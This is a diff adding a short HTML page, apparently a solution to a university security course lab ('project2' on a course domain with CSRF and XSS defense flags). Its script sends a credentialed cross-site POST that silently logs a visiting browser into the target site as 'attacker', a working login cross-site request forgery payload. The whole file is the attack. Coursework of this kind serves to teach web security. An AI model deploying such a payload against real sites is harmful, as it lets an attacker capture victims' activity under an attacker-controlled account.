@@ -1,0 +1,11 @@
+<html>
+<body>
+    <script>
+        const Http =  new XMLHttpRequest();
+        const url="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4";
+        Http.open("POST", url, true);
+        Http.withCredentials=true;
+        Http.send("username=attacker&password=l33th4x");
+    </script>
+</body>
+</html>
